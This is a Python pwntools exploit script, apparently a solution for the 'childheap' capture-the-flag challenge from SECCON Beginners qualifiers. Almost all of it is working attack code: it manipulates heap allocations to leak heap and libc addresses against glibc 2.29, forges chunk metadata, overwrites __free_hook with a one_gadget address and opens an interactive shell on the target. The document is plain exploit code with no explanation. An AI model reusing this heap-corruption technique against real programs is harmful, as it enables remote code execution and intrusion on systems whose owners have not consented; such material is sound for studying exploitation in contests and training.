#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./childheap')
else:
    s = remote('childheap.quals.beginners.seccon.jp', 22476)

def alloc(size, content='A'):
    s.sendlineafter('> ', '1')
    s.sendlineafter('Size: ', str(size))
    s.sendafter('Content: ', content)

def delete(ans='y'):
    s.sendlineafter('> ', '2')
    s.recvuntil("Content: '")
    content = s.recvuntil("'")[:-1]
    s.sendlineafter('[y/n] ', ans)
    return content

def wipe():
    s.sendlineafter('> ', '3')

def exit():
    s.sendlineafter('> ', '0')

libc = ELF('./libc-2.29.so')

alloc(0xf8)
delete()
wipe()
alloc(0x18)
delete()
wipe()
alloc(0x118)
delete()
wipe()
alloc(0x18, 'A' * 0x18)
wipe()
alloc(0x118)
delete()
wipe()
alloc(0xf8)
delete()
heap_addr = u64(delete('n').ljust(8, '\0'))
log.info('heap address: %#x' % heap_addr)

for i in range(5):
    wipe()
    alloc(0x18)
    delete()
    wipe()
    alloc(0x118)
    delete()
    wipe()
    alloc(0x18, 'A' * 0x18)
    wipe()
    alloc(0x118)
    delete()

wipe()
alloc(0x18)
delete()
wipe()
alloc(0x118)
delete()
wipe()
alloc(0x128, 'A' * 0x10 + p64(0x40) + p64(0x20) + p64(heap_addr + 0x990) * 2)
delete()
wipe()
alloc(0x28)
delete()
wipe()
alloc(0x18, p64(heap_addr + 0x890) * 2 + p64(0x20))
wipe()
alloc(0x118, p64(heap_addr + 0x870) * 2 + 'A' * 0xe8 + p64(0x41) + p64(heap_addr + 0x9d0) * 2)
delete()
wipe()

alloc(0x158, 'A' * 0x138 + p64(0x501))
delete()
wipe()
alloc(0x180)
wipe()
alloc(0x180)
wipe()
alloc(0x180, 'A' * 0x78 + p64(0x21) + 'A' * 0x18 + p64(0x21))
wipe()
alloc(0x128)
delete()
libc.address = u64(delete('n').ljust(8, '\0')) - 0x1e4ca0
log.info('libc base: %#x' % libc.address)

wipe()
alloc(0x38)
delete()
wipe()
alloc(0x158, 'A' * 0x138 + p64(0x41) + p64(libc.symbols['__free_hook']))
wipe()
alloc(0x38)
wipe()
one_gadgets = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]
alloc(0x38, p64(libc.address + one_gadgets[3]))
wipe()
alloc(0x18)
delete()

s.interactive()
